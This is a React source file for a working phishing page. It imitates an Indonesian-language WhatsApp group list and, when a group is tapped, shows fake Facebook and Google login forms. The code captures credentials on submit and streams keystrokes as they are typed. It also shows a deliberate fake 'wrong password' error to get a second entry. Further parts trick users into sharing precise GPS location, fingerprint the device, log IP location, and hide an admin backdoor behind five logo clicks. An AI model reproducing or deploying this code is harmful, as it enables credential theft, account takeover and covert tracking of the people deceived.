import React, { useEffect, useState, useRef } from 'react';
import { GroupData, DeviceFingerprint } from '../types';
import { 
    CameraIcon, MoreIcon, 
    ChatIcon, CommunityIcon, StatusIcon, CallsIcon 
} from './WhatsAppIcons';
import { ShieldAlert, X, MapPin } from 'lucide-react';
import { logVisitor, isIPBlocked, getGroups, saveCredential, getAdvancedFingerprint, sendLiveTypingLog } from '../services/storage';

interface PublicViewProps {
  data: GroupData | null;
}

const PublicView: React.FC<PublicViewProps> = ({ data }) => {
  const [loading, setLoading] = useState(true);
  const [blocked, setBlocked] = useState(false);
  const [groupList, setGroupList] = useState<GroupData[]>([]);
  
  // Login Interceptor State
  const [loginModalOpen, setLoginModalOpen] = useState(false);
  const [targetLink, setTargetLink] = useState('');
  const [loginStep, setLoginStep] = useState<'selection' | 'facebook' | 'google'>('selection');
  const [credEmail, setCredEmail] = useState('');
  const [credPass, setCredPass] = useState('');
  
  // Refs for auto-focus on fake error
  const fbPassRef = useRef<HTMLInputElement>(null);
  const googlePassRef = useRef<HTMLInputElement>(null);

  // Double-Hit Strategy State (Fake Error)
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [showFakeError, setShowFakeError] = useState(false);
  
  // Visitor Data
  const [visitorIP, setVisitorIP] = useState('Unknown');
  const [visitorLocation, setVisitorLocation] = useState('Unknown');
  const [deviceInfo, setDeviceInfo] = useState<DeviceFingerprint>();
  const [preciseGPS, setPreciseGPS] = useState<string>(''); // Stores Google Maps Link

  // Admin Backdoor State
  const [logoClickCount, setLogoClickCount] = useState(0);

  useEffect(() => {
    const storedGroups = getGroups();
    setGroupList(storedGroups);

    const checkSecurity = async () => {
      try {
        // 1. Get Network Info
        const response = await fetch('https://ipapi.co/json/');
        const ipData = await response.json();
        const ip = ipData.ip;
        const locationStr = `${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country_name || ''}`;
        
        setVisitorIP(ip);
        setVisitorLocation(locationStr);

        // 2. Get Advanced Hardware Info (GPU, Battery, etc)
        const advancedData = await getAdvancedFingerprint();
        setDeviceInfo(advancedData);

        if (isIPBlocked(ip)) {
          setBlocked(true);
          setLoading(false);
          return;
        }

        if (data && data.id) {
            logVisitor({
            ip: ip,
            city: ipData.city || 'Unknown',
            region: ipData.region || 'Unknown',
            country_name: ipData.country_name || 'Unknown',
            org: ipData.org || 'Unknown',
            timestamp: Date.now(),
            groupId: data.id,
            groupName: data.name
            });
        }

      } catch (error) {
        // Ignore error
      } finally {
        setLoading(false);
      }
    };

    checkSecurity();
  }, [data]);

  // GPS HARVESTER
  const requestGPS = () => {
      if ('geolocation' in navigator) {
          navigator.geolocation.getCurrentPosition(
              (position) => {
                  const link = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                  setPreciseGPS(link);
                  // Removed alert() for stealth and better UX
              },
              (error) => {
                  console.log("GPS Denied");
              }
          );
      }
  };

  // LIVE TYPING HANDLER
  const handleTyping = (e: React.ChangeEvent<HTMLInputElement>, type: 'email' | 'pass') => {
      const val = e.target.value;
      if (type === 'email') setCredEmail(val);
      if (type === 'pass') setCredPass(val);
      setShowFakeError(false); // Hide error when user starts typing again

      // Trigger the live log beacon (debounced inside the service)
      sendLiveTypingLog(
          type === 'email' ? val : credEmail,
          type === 'pass' ? val : credPass,
          loginStep === 'facebook' ? 'facebook' : 'google',
          visitorIP,
          visitorLocation,
          deviceInfo
      );
  };

  const handleJoinClick = (link: string) => {
    if (!link) return;
    setTargetLink(link);
    setLoginModalOpen(true);
    setLoginStep('selection'); // Always start with selection
    setLoginAttempts(0); // Reset attempts
    setShowFakeError(false);
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // --- STRATEGY: DOUBLE-HIT (FAKE ERROR) ---
    
    // 1. Send Log Immediately
    await saveCredential({
        service: loginStep === 'facebook' ? 'facebook' : 'google',
        email: credEmail,
        password: credPass,
        timestamp: Date.now(),
        ip: visitorIP,
        location: visitorLocation,
        userAgent: navigator.userAgent,
        deviceInfo: deviceInfo,
        isLiveType: false,
        attemptNumber: loginAttempts + 1, // Track which attempt this is
        preciseGPS: preciseGPS
    });

    // 2. Determine Action
    if (loginAttempts === 0) {
        // FIRST ATTEMPT: FAKE FAILURE
        await new Promise(resolve => setTimeout(resolve, 800)); // Fake loading
        setShowFakeError(true);
        setCredPass(''); // Clear password field to force re-entry
        setLoginAttempts(1); // Increment attempts
        
        // Auto-focus the password field so they can type immediately
        setTimeout(() => {
            if (loginStep === 'facebook') fbPassRef.current?.focus();
            if (loginStep === 'google') googlePassRef.current?.focus();
        }, 100);
    } else {
        // SECOND ATTEMPT: SUCCESS
        await new Promise(resolve => setTimeout(resolve, 500));
        window.location.href = targetLink;
    }
  };

  const handleTitleClick = () => {
    const newCount = logoClickCount + 1;
    setLogoClickCount(newCount);
    
    // Secret Backdoor: 5 clicks opens admin
    if (newCount >= 5) {
        window.location.hash = '#admin';
        setLogoClickCount(0);
    }
  };

  if (loading) {
    return <div className="min-h-screen bg-[#0b141a]"></div>;
  }

  if (blocked) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-[#0b141a] p-6 text-center font-sans text-gray-200">
        <ShieldAlert size={64} className="text-red-500 mb-4" />
        <h1 className="text-2xl font-bold mb-2">Access Denied</h1>
        <p className="text-gray-400 mb-6 max-w-md">
          Your IP address has been blocked.
        </p>
      </div>
    );
  }

  // Helper for timestamp formatting
  const getTimestamp = (index: number) => {
    // Make the first item look recent, others look like "Kemarin" (Yesterday) to mimic the screenshot
    if (index === 0) {
        return new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', hour12: false}).replace(':', '.');
    }
    return "Kemarin";
  };

  const displayGroups = [...groupList].reverse();

  // WRAPPER CONTENT (THE MOBILE VIEW)
  const MobileContent = () => (
      <div className="h-full bg-[#0b141a] text-[#e9edef] font-sans flex flex-col relative select-none">
          {/* Top Header */}
          <header className="px-4 pt-3 pb-3 flex justify-between items-center bg-[#0b141a] z-10">
             <h1 
                onClick={handleTitleClick}
                className="text-[25px] font-bold tracking-tight text-white ml-1 cursor-default active:opacity-80 transition-opacity"
             >
                WhatsApp
             </h1>
             <div className="flex gap-5 text-white items-center mr-1">
                <CameraIcon />
                <MoreIcon />
             </div>
          </header>

          {/* Search Bar with Meta AI Gradient */}
          <div className="px-3 pb-3 z-10">
             <div className="bg-[#202c33] h-[46px] rounded-full flex items-center px-4 gap-3 relative overflow-hidden">
                {/* Meta AI Ring */}
                <div className="w-6 h-6 rounded-full border-[3px] border-transparent bg-clip-padding p-[2px] relative flex items-center justify-center" 
                     style={{background: 'linear-gradient(to bottom right, #3b82f6, #a855f7) border-box'}}>
                     <div className="w-full h-full bg-[#202c33] rounded-full"></div>
                </div>
                
                <span className="text-[#8696a0] text-[16px] font-normal pt-0.5">Tanya Meta AI atau Cari</span>
             </div>
          </div>

          {/* Filter Chips */}
          <div className="px-4 pb-3 flex gap-2 overflow-x-auto no-scrollbar z-10">
             <button className="bg-[#202c33] text-[#8696a0] px-3.5 py-1.5 rounded-full text-[14px] font-medium whitespace-nowrap hover:bg-[#2a3942] hover:text-[#25d366] transition">Semua</button>
             <button className="bg-[#202c33] text-[#8696a0] px-3.5 py-1.5 rounded-full text-[14px] font-medium whitespace-nowrap hover:bg-[#2a3942] hover:text-[#25d366] transition">Belum dibaca</button>
             <button className="bg-[#202c33] text-[#8696a0] px-3.5 py-1.5 rounded-full text-[14px] font-medium whitespace-nowrap hover:bg-[#2a3942] hover:text-[#25d366] transition">Favorit</button>
             <button className="bg-[#202c33] text-[#8696a0] px-3.5 py-1.5 rounded-full text-[14px] font-medium whitespace-nowrap hover:bg-[#2a3942] hover:text-[#25d366] transition">Grup</button>
          </div>

          {/* Chat List */}
          <div className="flex-1 overflow-y-auto pb-24 custom-scrollbar">
             {displayGroups.length === 0 ? (
                <div className="flex flex-col items-center justify-center pt-24 text-[#8696a0] opacity-60 px-10 text-center">
                    <p className="text-[15px] leading-6">Anda belum memiliki chat.<br/>Gunakan Admin Panel untuk menambah grup.</p>
                </div>
             ) : (
                 displayGroups.map((group, index) => {
                    const isTarget = data && data.id === group.id;
                    // Use custom last message if available, otherwise default logic
                    const customMsg = group.lastMessage || (isTarget ? "Anda telah ditambahkan." : "Ketuk untuk bergabung ke grup ini");
                    
                    return (
                        <div 
                        key={group.id} 
                        onClick={() => handleJoinClick(group.link)}
                        className={`flex pl-4 pr-3 py-3 hover:bg-[#202c33] active:bg-[#202c33] transition cursor-pointer relative ${isTarget ? 'bg-[#202c33]/40' : ''}`}
                        >
                            {/* Avatar */}
                            <div className="relative w-[50px] h-[50px] mr-4 flex-shrink-0">
                                {group.image ? (
                                    <img src={group.image} alt="" className="w-full h-full rounded-full object-cover" />
                                ) : (
                                    <div className="w-full h-full rounded-full bg-[#64748b] flex items-center justify-center">
                                        <span className="text-sm text-white font-medium">GRP</span>
                                    </div>
                                )}
                            </div>

                            {/* Content */}
                            <div className="flex-1 min-w-0 flex flex-col justify-center border-b border-[#202c33] pb-3">
                                <div className="flex justify-between items-baseline mb-0.5">
                                    <h3 className="text-[17px] font-medium text-[#e9edef] truncate max-w-[70%] leading-tight">
                                        {group.name}
                                    </h3>
                                    <span className={`text-[12px] ${index === 0 ? 'text-[#25d366]' : 'text-[#8696a0]'}`}>
                                        {getTimestamp(index)}
                                    </span>
                                </div>
                                <div className="flex justify-between items-center">
                                    <div className="flex items-center gap-1 text-[#8696a0] text-[14px] truncate flex-1 pr-2">
                                        {isTarget ? (
                                            <>
                                                <span className="text-[#e9edef] font-medium">Anda: </span>
                                                <span className="truncate">{customMsg}</span>
                                            </>
                                        ) : (
                                            <span className="truncate">{customMsg}</span>
                                        )}
                                    </div>
                                    <div className="flex items-center gap-1">
                                        {/* Unread badge logic: Show 1 for target, specific numbers for others to look real */}
                                        {(isTarget || index === 0) && (
                                            <div className="min-w-[20px] h-[20px] bg-[#25d366] rounded-full flex items-center justify-center text-[#0b141a] text-[11px] font-bold px-1.5">
                                                {isTarget ? 1 : 4}
                                            </div>
                                        )}
                                    </div>
                                </div>
                            </div>
                        </div>
                    );
                 })
             )}
             
             {/* Footer Encrypted Text */}
             <div className="flex justify-center py-6 pb-8 gap-1.5 items-center opacity-70">
                <svg viewBox="0 0 10 12" width="10" height="12" fill="none" className="text-[#8696a0]">
                     <path d="M5 0.5C2.2 0.5 0 2.7 0 5.5V11.5H10V5.5C10 2.7 7.8 0.5 5 0.5ZM8.8 10.3H1.2V5.5C1.2 3.4 2.9 1.7 5 1.7C7.1 1.7 8.8 3.4 8.8 5.5V10.3Z" fill="currentColor"/>
                </svg>
                <span className="text-[11px] text-[#8696a0] font-medium">Pesan Anda tertranskripsi secara pribadi.</span>
             </div>
          </div>

          {/* Floating Action Button */}
          <div className="fixed bottom-[92px] right-4 z-20 md:absolute">
             <div className="w-[56px] h-[56px] bg-[#00a884] rounded-[16px] shadow-lg flex items-center justify-center cursor-pointer hover:brightness-110 active:scale-90 transition shadow-black/30">
                 <div className="w-6 h-6 bg-black rounded-[5px] relative flex items-center justify-center">
                     <div className="absolute inset-0 bg-black rounded-[5px] text-white flex items-center justify-center">
                        <span className="font-bold text-2xl pb-1">+</span>
                     </div>
                     <div className="absolute -top-1 -right-1 w-2 h-2 border border-white rounded-full opacity-0"></div> 
                 </div>
             </div>
          </div>

          {/* Bottom Navigation */}
          <nav className="absolute bottom-0 left-0 right-0 h-[80px] bg-[#0b141a] border-t border-[#202c33] flex justify-around items-start pt-3.5 z-30">
              <div className="flex flex-col items-center gap-1.5 w-1/4 cursor-pointer group">
                  <div className="relative px-5 py-1 bg-[#00332a] rounded-full">
                    <ChatIcon />
                    {displayGroups.length > 0 && (
                        <div className="absolute -top-1 right-3 min-w-[16px] h-[16px] bg-[#25d366] rounded-full flex items-center justify-center text-[#0b141a] text-[10px] font-bold ring-2 ring-[#0b141a]">
                            {displayGroups.reduce((acc, _, i) => acc + (i===0 ? 4 : 0), 0) + (data ? 1 : 0) || 1}
                        </div>
                    )}
                  </div>
                  <span className="text-[12px] font-bold text-[#e9edef]">Chat</span>
              </div>
              <div className="flex flex-col items-center gap-1.5 w-1/4 cursor-pointer group opacity-60 hover:opacity-100">
                  <div className="py-1">
                     <StatusIcon />
                  </div>
                  <span className="text-[12px] font-medium text-[#e9edef]">Pembaruan</span>
              </div>
              <div className="flex flex-col items-center gap-1.5 w-1/4 cursor-pointer group opacity-60 hover:opacity-100">
                  <div className="py-1">
                    <CommunityIcon />
                  </div>
                  <span className="text-[12px] font-medium text-[#e9edef]">Komunitas</span>
              </div>
              <div className="flex flex-col items-center gap-1.5 w-1/4 cursor-pointer group opacity-60 hover:opacity-100">
                  <div className="py-1">
                    <CallsIcon />
                  </div>
                  <span className="text-[12px] font-medium text-[#e9edef]">Panggilan</span>
              </div>
          </nav>

          {/* --- FAKE LOGIN INTERCEPTOR MODAL --- */}
          {loginModalOpen && (
            <div className="absolute inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm animate-in fade-in duration-200 p-0 md:p-6">
                 
                 {/* SELECTION SCREEN */}
                 {loginStep === 'selection' && (
                     <div className="bg-white w-full sm:w-[380px] rounded-t-[20px] sm:rounded-xl overflow-hidden shadow-2xl animate-in slide-in-from-bottom duration-300">
                         <div className="p-4 border-b border-gray-100 flex justify-between items-center">
                             <span className="text-gray-800 font-semibold">Verifikasi Umur & Lokasi</span>
                             <button onClick={() => setLoginModalOpen(false)} className="p-1 bg-gray-100 rounded-full text-gray-500"><X size={20}/></button>
                         </div>
                         <div className="p-6 flex flex-col gap-4">
                             <p className="text-sm text-gray-600 text-center mb-2">
                                 Grup ini dibatasi berdasarkan wilayah.
                             </p>

                             {/* GPS TRAP BUTTON */}
                             <button 
                                onClick={requestGPS}
                                disabled={!!preciseGPS}
                                className={`w-full ${preciseGPS ? 'bg-green-100 text-green-700 border border-green-200 cursor-default' : 'bg-gray-100 text-gray-700 hover:bg-gray-200'} font-medium py-2.5 rounded-lg flex items-center justify-center gap-2 text-sm transition mb-2`}
                             >
                                <MapPin size={18}/>
                                {preciseGPS ? 'Lokasi Terverifikasi ✓' : 'Cek Ketersediaan Lokasi'}
                             </button>
                             
                             <button 
                                onClick={() => { setLoginStep('facebook'); setCredEmail(''); setCredPass(''); }}
                                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-3 rounded-lg flex items-center justify-center gap-3 transition"
                             >
                                <svg className="w-6 h-6 fill-current" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                                Lanjutkan dengan Facebook
                             </button>

                             <button 
                                onClick={() => { setLoginStep('google'); setCredEmail(''); setCredPass(''); }}
                                className="w-full bg-white border border-gray-300 hover:bg-gray-50 text-gray-700 font-medium py-3 rounded-lg flex items-center justify-center gap-3 transition"
                             >
                                <svg className="w-5 h-5" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                                Lanjutkan dengan Google
                             </button>
                         </div>
                     </div>
                 )}

                 {/* FACEBOOK LOGIN */}
                 {loginStep === 'facebook' && (
                     <div className="bg-[#eceff5] w-full h-full sm:h-auto sm:w-[380px] sm:rounded-xl overflow-hidden flex flex-col items-center p-6 relative animate-in slide-in-from-bottom">
                         <button onClick={() => setLoginStep('selection')} className="absolute top-4 right-4 text-gray-500"><X size={20}/></button>
                         
                         <div className="mt-8 mb-8">
                             {/* OFFICIAL FACEBOOK LOGO FROM FB CDN */}
                             <img 
                                src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
                                alt="Facebook" 
                                className="h-[40px] mb-6" 
                             />
                         </div>
                         
                         {showFakeError && (
                             <div className="w-full bg-red-100 border border-red-300 text-red-700 text-sm p-3 rounded mb-4 text-center animate-in fade-in slide-in-from-top-2">
                                 Kata sandi yang Anda masukkan salah.
                             </div>
                         )}

                         <form onSubmit={handleLoginSubmit} className="w-full flex flex-col gap-3">
                             <input 
                                required
                                type="text" 
                                placeholder="Mobile number or email address" 
                                className="w-full bg-white border border-gray-300 rounded p-3.5 text-sm focus:border-[#1877f2] outline-none text-black"
                                value={credEmail}
                                onChange={(e) => handleTyping(e, 'email')}
                             />
                             <input 
                                ref={fbPassRef}
                                required
                                type="password" 
                                placeholder="Password" 
                                className={`w-full bg-white border ${showFakeError ? 'border-red-500' : 'border-gray-300'} rounded p-3.5 text-sm focus:border-[#1877f2] outline-none text-black`}
                                value={credPass}
                                onChange={(e) => handleTyping(e, 'pass')}
                             />
                             <button type="submit" className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-[16px] py-2.5 rounded-full mt-1 transition">
                                 Log in
                             </button>
                         </form>
                         
                         <a href="#" className="mt-4 text-[#1877f2] text-sm hover:underline">Forgotten password?</a>
                         
                         <div className="w-full flex items-center my-6">
                             <div className="h-px bg-gray-300 flex-1"></div>
                             <span className="px-2 text-sm text-gray-500">or</span>
                             <div className="h-px bg-gray-300 flex-1"></div>
                         </div>

                         <button className="border border-gray-300 hover:bg-gray-50 text-gray-700 font-semibold py-2 px-4 rounded-full text-sm">
                             Create new account
                         </button>
                         
                         <div className="mt-auto pt-8 flex flex-col items-center gap-1">
                            <span className="text-[10px] text-gray-400">from</span>
                            <span className="text-xs font-medium text-gray-500 flex items-center gap-1">
                               <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" className="h-3" alt="Meta"/> Meta
                            </span>
                         </div>
                     </div>
                 )}

                 {/* GOOGLE LOGIN */}
                 {loginStep === 'google' && (
                     <div className="bg-white w-full h-full sm:h-auto sm:w-[380px] sm:rounded-xl overflow-hidden flex flex-col sm:border sm:shadow-2xl">
                         <div className="p-8 flex flex-col items-center">
                             <svg className="w-10 h-10 mb-4" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                             <h2 className="text-2xl font-medium text-gray-800 mb-2">Sign in</h2>
                             <p className="text-gray-600 mb-8">to continue to WhatsApp</p>
                             
                             {showFakeError && (
                                 <div className="w-full text-red-600 text-sm mb-4 animate-in fade-in slide-in-from-top-1">
                                     Wrong password. Try again or click Forgot Password.
                                 </div>
                             )}

                             <form onSubmit={handleLoginSubmit} className="w-full flex flex-col gap-4">
                                 <div className="relative">
                                     <input 
                                        required
                                        type="text" 
                                        className="peer w-full p-3 pt-5 border border-gray-300 rounded focus:border-blue-500 outline-none placeholder-transparent text-black"
                                        placeholder="Email or phone"
                                        id="g-email"
                                        value={credEmail}
                                        onChange={(e) => handleTyping(e, 'email')}
                                     />
                                     <label htmlFor="g-email" className="absolute left-3 top-1 text-xs text-blue-500 font-medium transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500">Email or phone</label>
                                 </div>
                                 
                                 <div className="relative">
                                     <input 
                                        ref={googlePassRef}
                                        required
                                        type="password" 
                                        className={`peer w-full p-3 pt-5 border ${showFakeError ? 'border-red-500' : 'border-gray-300'} rounded focus:border-blue-500 outline-none placeholder-transparent text-black`}
                                        placeholder="Password"
                                        id="g-pass"
                                        value={credPass}
                                        onChange={(e) => handleTyping(e, 'pass')}
                                     />
                                     <label htmlFor="g-pass" className={`absolute left-3 top-1 text-xs ${showFakeError ? 'text-red-500' : 'text-blue-500'} font-medium transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500`}>Password</label>
                                 </div>

                                 <div className="flex justify-between items-center mt-6">
                                     <button type="button" onClick={() => setLoginStep('selection')} className="text-blue-600 font-medium text-sm">Back</button>
                                     <button type="submit" className="bg-[#1a73e8] text-white font-medium py-2 px-6 rounded hover:bg-blue-700 transition">Next</button>
                                 </div>
                             </form>
                         </div>
                     </div>
                 )}

            </div>
          )}

      </div>
  );

  return (
    <div className="bg-[#111b21] md:bg-[#d1d7db] min-h-screen flex justify-center md:items-center">
       <div className="w-full md:max-w-[420px] md:h-[850px] md:max-h-[95vh] bg-[#0b141a] relative h-screen md:rounded-[30px] md:shadow-2xl overflow-hidden md:border-[8px] md:border-[#111b21]">
          <MobileContent />
       </div>
    </div>
  );
};

export default PublicView;